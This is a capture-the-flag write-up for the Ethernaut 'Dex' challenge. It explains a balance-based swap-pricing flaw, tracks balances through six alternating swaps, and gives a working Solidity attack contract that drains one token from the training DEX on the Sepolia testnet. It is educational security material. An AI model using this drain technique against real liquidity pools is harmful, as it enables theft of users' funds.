# Ethernaut #22 — Dex

## Objective

Drain all of at least one token from the DEX.

The contract starts with 100 units each of `token1` and `token2`. The player starts with 10 units of each token.

The challenge exposes a swap function that calculates output amounts using the DEX's current token balances. The goal is to exploit this pricing mechanism to drain one of the token reserves.

## Vulnerability

The vulnerable pricing logic is:

```solidity
function getSwapPrice(
    address from,
    address to,
    uint256 amount
) public view returns (uint256) {
    return (amount * IERC20(to).balanceOf(address(this))) /
        IERC20(from).balanceOf(address(this));
}
```

The vulnerable pricing formula is:

$$
\text{amountOut} =
\frac{\text{amountIn} \times \text{outputTokenBalance}}
{\text{inputTokenBalance}}
$$

The calculation uses the DEX's current token balances, but it does not enforce a constant-product invariant such as $x \cdot y = k$.

Consequently, repeated swaps can manipulate the exchange ratio and produce increasingly favorable outputs.

## Exploit Strategy

Rather than trying to drain the DEX in a single swap, I tracked the balances after each transaction and followed the changing exchange rate.

Initially:

- DEX: 100 T1 and 100 T2
- Player: 10 T1 and 10 T2

The sequence alternates between swapping all of the currently held input token and receiving the other token.

## Manual Balance Calculations

The following table tracks the balances using the challenge's integer arithmetic.

| Step | Swap | Player T1 | Player T2 | DEX T1 | DEX T2 |
|---|---|---:|---:|---:|---:|
| Start | — | 10 | 10 | 100 | 100 |
| 1 | 10 T1 → 10 T2 | 0 | 20 | 110 | 90 |
| 2 | 20 T2 → 24 T1 | 24 | 0 | 86 | 110 |
| 3 | 24 T1 → 30 T2 | 0 | 30 | 110 | 80 |
| 4 | 30 T2 → 41 T1 | 41 | 0 | 69 | 110 |
| 5 | 41 T1 → 65 T2 | 0 | 65 | 110 | 45 |
| 6 | 45 T2 → 110 T1 | 110 | 20 | 0 | 90 |

The sixth swap requests exactly the DEX's remaining 110 T1, leaving its T1 balance at zero.

*Note:* Solidity performs integer division, truncating fractional remainders. The calculations above reflect the integer outputs of the challenge's pricing formula.

## Attack Contract

I automated the sequence in a Solidity attack contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
}

contract Attack {
    IDex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(IDex _dex) {
        dex = _dex;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function drainT1() external {
        // Pull the initial tokens from the player.
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        // Allow the DEX to pull tokens from this contract.
        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        // Alternate swaps using the current input-token balance.
        fullSwap(token1, token2);
        fullSwap(token2, token1);
        fullSwap(token1, token2);
        fullSwap(token2, token1);
        fullSwap(token1, token2);

        // Drain the remaining T1.
        dex.swap(address(token2), address(token1), 45);

        // Verify the target outcome.
        require(token1.balanceOf(address(dex)) == 0);
    }

    function fullSwap(IERC20 from, IERC20 to) internal {
        dex.swap(
            address(from),
            address(to),
            from.balanceOf(address(this))
        );
    }
}
```

### Execution Flow

1. Deploy the attack contract with the target DEX address.
2. Approve the attack contract to transfer 10 units of each token from the player.
3. Call `drainT1()`.
4. The attack contract pulls the tokens from the player and approves the DEX.
5. It executes the alternating swap sequence, using its current input-token balance for each swap.
6. It swaps the final 45 T2 for the remaining 110 T1.
7. The final assertion verifies that the DEX holds zero T1.

Because all swaps occur within one transaction, the entire sequence is atomic: if any swap or the final assertion reverts, the earlier swaps in that transaction are rolled back.

## On-chain Proof of Concept

- **Network:** Sepolia
- **DEX instance:** `0xa2C3f37212651370322265E132c42411FBcC906C`
- **Attack contract:** `0x743fA4CCBC8c6bBd46a979aD871A90A84cA6cE3d`
- **Deployment transaction:** [View on Etherscan](https://sepolia.etherscan.io/tx/0x083150d3bfb184ff6f5dad663a027b219563edd738ed6ff6693c26e8f57e90a9)
- **Exploit transaction:** [View on Etherscan](https://sepolia.etherscan.io/tx/0x20be414d63f090a3361a9ee1333015528d7c938ee802ffef7614ffa225f8e99c)
- **Result:** Successfully drained the DEX's T1 balance to zero.
The attack drained the DEX's `token1` balance to zero.

## Root Cause

The root cause is **balance-based pricing without an invariant that constrains the pool's economic behavior**.

The DEX recalculates the exchange rate from its current reserves after each swap. This allows an attacker to repeatedly manipulate the ratio and exploit the resulting output calculations.

A constant-product AMM, for example, uses a pricing mechanism designed around the relationship between its reserves, alongside fees and other implementation details. The vulnerable DEX does not provide equivalent protection.

## Key Takeaways

- Always inspect how a DEX calculates swap output.
- Track both the player's balances and the pool's balances after every swap.
- Solidity integer division truncates fractional remainders.
- `transferFrom()` requires the spender to have sufficient allowance.
- When an attack contract calls the DEX, the DEX sees the attack contract as `msg.sender`.
- Atomic execution makes multi-step exploits easier to coordinate, but a revert rolls back the entire sequence.
- A pricing formula that uses live balances is not automatically a safe AMM design.

## Conclusion

Ethernaut #22 demonstrated how a flawed swap-pricing mechanism can allow repeated trades to drain one side of a token pool.

I first worked through the changing balances manually, then automated the swap sequence in a Solidity attack contract. The final transaction drained all T1 from the DEX.

**Challenge #22 — Dex: Solved.**